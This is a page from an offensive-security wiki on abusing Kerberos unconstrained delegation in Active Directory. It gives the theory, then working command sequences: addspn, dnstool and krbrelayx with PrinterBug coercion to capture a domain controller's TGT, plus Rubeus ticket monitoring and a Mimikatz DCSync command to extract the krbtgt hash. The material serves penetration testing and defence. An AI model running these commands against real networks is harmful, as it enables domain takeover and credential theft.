---
authors: 'A1vinSmith, ShutdownRepo, sckdev'
category: ad
---

# (KUD) Unconstrained

## Theory

If an account (user or computer), with unconstrained delegations privileges, is compromised, an attacker must wait for a privileged user to authenticate on it (or [force it](../../mitm-and-coerced-authentications/)) using Kerberos. The attacker service will receive an ST (service ticket) containing the user's TGT. That TGT will be used by the service as a proof of identity to obtain access to a target service as the target user. Alternatively, the TGT can be used with [S4U2self abuse](s4u2self-abuse.md) in order to gain local admin privileges over the TGT's owner.

> [!WARNING]
> If the coerced account is "[is sensitive and cannot be delegated](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts)" or a member of the "[Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)" group, its TGT will not be delegated in the service ticket used for authentication against the attacker-controlled KUD account.

> [!TIP]
> **Nota bene**: the native, RID 500, "Administrator" account doesn't benefit from that restriction, even if it's added to the Protected Users group (source: [sensepost.com](https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/)).

> [!NOTE]
> Unconstrained delegation abuses are usually combined with an [MS-RPRN abuse (printerbug)](../../mitm-and-coerced-authentications/ms-rprn.md), [MS-EFSR abuse (petitpotam)](../../mitm-and-coerced-authentications/ms-efsr.md), [MS-FSRVP abuse (shadowcoerce)](../../mitm-and-coerced-authentications/ms-fsrvp.md), r [PrivExchange](../../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to gain domain admin privileges.

![](<assets/KUD mindmap.png>)

## Practice

::: tabs

=== From the attacker machine (UNIX-like)

In order to abuse the unconstrained delegations privileges of an account, an attacker must add his machine to its SPNs (i.e. of the compromised account) and add a DNS entry for that name.

This allows targets (e.g. Domain Controllers or Exchange servers) to authenticate back to the attacker machine.

All of this can be done from UNIX-like systems with [addspn](https://github.com/dirkjanm/krbrelayx), [dnstool](https://github.com/dirkjanm/krbrelayx) and [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python).

> [!TIP]
> When attacking accounts able to delegate without constraints, there are two major scenarios
> 
> * the account is a computer: computers can edit their own SPNs via the `msDS-AdditionalDnsHostName` attribute. Since ticket received by krbrelayx will be encrypted with AES256 (by default), attackers will need to either supply the right AES256 key for the unconstrained delegations account (`--aesKey` argument) or the salt and password (`--krbsalt` and `--krbpass` arguments).
> * the account is a user: users can't edit their own SPNs like computers do. Attackers need to control an [account operator](../../builtins/security-groups) (or any other user that has the needed privileges) to edit the user's SPNs. Moreover, since tickets received by krbrelayx will be encrypted with RC4, attackers will need to either supply the NT hash (`-hashes` argument) or the salt and password (`--krbsalt` and `--krbpass` arguments)

> [!SUCCESS]
> By default, the salt is always
> 
> * For users: uppercase FQDN + case sensitive username = `DOMAIN.LOCALuser`
> * For computers: uppercase FQDN + hardcoded `host` text + lowercase FQDN hostname without the trailing `$` = `DOMAIN.LOCALhostcomputer.domain.local`\
> `(using` DOMAIN.LOCAL\computer$ `account)`

```bash
# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'

# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'

# 3. Check that the record was added successfully (after ~3 minutes)
nslookup attacker.DOMAIN_FQDN DomainController

# 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)
# 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keys
krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'
# 4.b. or supply the right Kerberos long-term key directly
krbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE

# 5. Authentication coercion
# PrinterBug, PetitPotam, PrivExchange, ...
printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'

# 6. Check if it works. Krbrelayx should have received and decrypted a ticket, extracting the coerced principal's TGT.
# There should be a krbtgt ccache file in the current directory. And it can be used by
export KRB5CCNAME=`pwd`/'krbtgt.ccache'
```

> [!CAUTION]
> In case, for some reason, attacking a Domain Controller doesn't work (i.e. error saying`Ciphertext integrity failed.`) try to attack others (if you're certain the credentials you supplied were correct). Some replication and propagation issues could get in the way.

Once the krbrelayx listener is ready, an [authentication coercion attack](../../mitm-and-coerced-authentications/) (e.g. [PrinterBug](../../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange), [PetitPotam](../../mitm-and-coerced-authentications/ms-efsr.md)) can be operated. The listener will then receive a Kerberos authentication, hence a ST, containing a TGT.

The TGT will then be usable with [Pass the Ticket](../ptt.md) (to act as the victim) or with [S4U2self abuse](s4u2self-abuse.md) (to obtain local admin privileges over the victim).


=== From the compromised computer (Windows)

Once the KUD capable host is compromised, [Rubeus](https://github.com/GhostPack/Rubeus) can be used (on the compromised host) as a listener to wait for a user to authenticate, the ST to show up and to extract the TGT it contains.

```bash
Rubeus.exe monitor /interval:5
```

Once the monitor is ready, a [forced authentication attack](../../mitm-and-coerced-authentications/) (e.g. [PrinterBug](../../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange)) can be operated. Rubeus will then receive an authentication (hence a Service Ticket, containing a TGT). The TGT can be used to request a Service Ticket for another service.

```bash
Rubeus.exe asktgs /ticket:$base64_extracted_TGT /service:$target_SPN /ptt
```

Alternatively, the TGT can be used with [S4U2self abuse](s4u2self-abuse.md) in order to gain local admin privileges over the TGT's owner.

Once the TGT is injected, it can natively be used when accessing a service. For example, with [Mimikatz](https://github.com/gentilkiwi/mimikatz), to extract the `krbtgt` hash with [`lsadump::dcsync`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync).

```bash
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
```

:::


## Resources

[https://stealthbits.com/blog/unconstrained-delegation-permissions/](https://stealthbits.com/blog/unconstrained-delegation-permissions/)

[https://exploit.ph/user-constrained-delegation.html](https://exploit.ph/user-constrained-delegation.html)

[https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
